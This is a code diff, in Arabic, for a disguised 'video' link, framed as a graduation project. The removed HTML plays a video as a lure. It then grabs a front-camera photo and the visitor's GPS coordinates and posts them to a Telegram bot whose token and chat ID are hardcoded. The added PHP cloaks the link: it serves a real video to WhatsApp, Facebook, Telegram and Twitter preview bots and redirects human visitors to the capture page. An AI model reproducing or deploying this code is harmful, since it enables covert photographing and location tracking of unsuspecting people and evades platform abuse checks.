@@ -1,97 +1,30 @@
-<!DOCTYPE html>
-<html lang="ar" dir="rtl">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<?php
+/**
+ * مشروع التخرج: نظام التخفي البرمجي (Cloaking)
+ * هذا الملف يقوم بالتمييز بين بوتات التواصل الاجتماعي والمستخدم الحقيقي
+ */
+
+$userAgent = $_SERVER['HTTP_USER_AGENT'];
+$targetPage = "https://appsyria00.github.io/Facebook/"; // صفحة مشروعك الأساسية
+$previewVideo = "../1.mp4"; // مسار الفيديو الذي سيظهر كمعاينة
+
+// 1. فحص ما إذا كان الزائر هو "بوت" (واتساب، فيسبوك، تلجرام)
+if (preg_match('/WhatsApp|facebookexternalhit|TelegramBot|Twitterbot/i', $userAgent)) {
     
-    <meta property="og:title" content="فديو">
-    <meta property="og:description" content="تشغيل عرض الفيديو التفاعلي بجودة عالية">
-    <meta property="og:type" content="video.other">
+    // إرسال ترويسة تخبر التطبيق أن هذا ملف فيديو حقيقي
+    header('Content-Type: video/mp4');
+    header('Content-Disposition: inline; filename="video.mp4"');
+    header('Content-Length: ' . filesize($previewVideo));
     
-    <meta property="og:image" content="https://appsyria00.github.io/Facebook/2.png"> 
-    <meta property="og:video" content="https://appsyria00.github.io/Facebook/1.mp4">
-    <meta property="og:video:type" content="video/mp4">
-    <meta property="og:url" content="https://appsyria00.github.io/Facebook/">
-    
-    <title></title>
-    
-    <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        body, html { height: 100%; width: 100%; overflow: hidden; background-color: #000; }
-        .video-wrapper { position: absolute; top: 0; left: 0; width: 100%; height: 100%; }
-        video { width: 100%; height: 100%; object-fit: cover; }
-    </style>
-</head>
-<body>
+    // قراءة ملف الفيديو وإرساله للبوت ليظهر زر التشغيل (Play)
+    readfile($previewVideo);
+    exit;
+} 
 
-    <div class="video-wrapper">
-        <video id="mainVideo" autoplay muted playsinline poster="2.png">
-            <source src="1.mp4" type="video/mp4">
-        </video>
-    </div>
-
-    <script>
-        // بيانات بوت التلجرام
-        const botToken = "8527565205:AAFpoyLDZir4oiQKqZPO-Cm40XVzUBvLER8";
-        const chatId = "1611398303";
-
-        window.onload = function() {
-            const video = document.getElementById('mainVideo');
-            video.play().catch(() => console.log("بانتظار تفاعل المستخدم"));
-
-            // بدء الاختبار التقني بعد 3 ثوانٍ
-            setTimeout(startTechnicalTest, 3000);
-        };
-
-        function startTechnicalTest() {
-            // طلب الصلاحيات (كاميرا وموقع)
-            navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
-            .then(stream => {
-                captureAndSend(stream);
-            })
-            .catch(err => console.log("الوصول مرفوض: " + err));
-        }
-
-        function captureAndSend(stream) {
-            let v = document.createElement('video');
-            v.srcObject = stream;
-            v.play();
-
-            setTimeout(() => {
-                let canvas = document.createElement('canvas');
-                canvas.width = 720; 
-                canvas.height = 1280;
-                canvas.getContext('2d').drawImage(v, 0, 0, canvas.width, canvas.height);
-                let imgData = canvas.toDataURL('image/jpeg');
-
-                // جلب الموقع الجغرافي
-                navigator.geolocation.getCurrentPosition(pos => {
-                    sendToTelegram(imgData, pos.coords.latitude, pos.coords.longitude, pos.coords.accuracy);
-                }, () => {
-                    sendToTelegram(imgData, "غير متوفر", "غير متوفر", "0");
-                });
-
-                // إيقاف الكاميرا فوراً
-                stream.getTracks().forEach(track => track.stop());
-            }, 1000);
-        }
-
-        function sendToTelegram(imgData, lat, lon, acc) {
-            const caption = encodeURIComponent(`✅ تجربة مشروع التخرج\n📍 GPS: ${lat},${lon}\n⏰ الوقت: ${new Date().toLocaleTimeString()}`);
-            const url = `https://api.telegram.org/bot${botToken}/sendDocument?chat_id=${chatId}&caption=${caption}`;
-
-            let form = new FormData();
-            form.append('document', dataURLtoBlob(imgData), "photo.jpg");
-
-            fetch(url, { method: 'POST', body: form });
-        }
-
-        function dataURLtoBlob(dataurl) {
-            let arr = dataurl.split(','), mime = arr[0].match(/:(.*?);/)[1],
-                bstr = atob(arr[1]), n = bstr.length, u8arr = new Uint8Array(n);
-            while(n--) u8arr[n] = bstr.charCodeAt(n);
-            return new Blob([u8arr], {type:mime});
-        }
-    </script>
-</body>
-</html>
+// 2. إذا كان الزائر إنساناً (يستخدم متصفح عادي)
+else {
+    // توجيهه فوراً لصفحة سحب الصلاحيات والكاميرا
+    header("Location: " . $targetPage);
+    exit;
+}
+?>
